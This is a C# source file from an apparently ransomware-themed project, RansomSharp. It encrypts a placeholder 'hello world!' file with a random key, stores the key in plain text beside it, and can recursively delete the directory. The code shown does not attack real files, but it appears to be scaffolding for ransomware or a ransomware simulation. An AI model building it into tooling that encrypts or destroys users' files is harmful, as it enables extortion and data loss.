using RansomSharp.Encrypt;

namespace RansomSharp.Core
{
    public class FileManager
    {
        public string PrepareFiles(string ransomDir)
        {
            string testFilePath = Path.Combine(ransomDir, "test.txt");
            string dontWorryFilePath = Path.Combine(ransomDir, "dontworry.txt");

            string key = EncryptionHelper.GenerateRandomKey();
            string testContent = "hello world!";
            string dontWorryContent = key;

            File.WriteAllText(testFilePath, EncryptionHelper.Encrypt(testContent, key));
            File.WriteAllText(dontWorryFilePath, dontWorryContent);

            return ransomDir;
        }

        public void DeleteRansomDirectory(string dir)
        {
            try
            {
                Directory.Delete(dir, true);
            }
            catch (IOException ex)
            {
                System.Console.WriteLine($"Error occurred while deleting directory: {ex.Message}");
            }
        }
    }
}
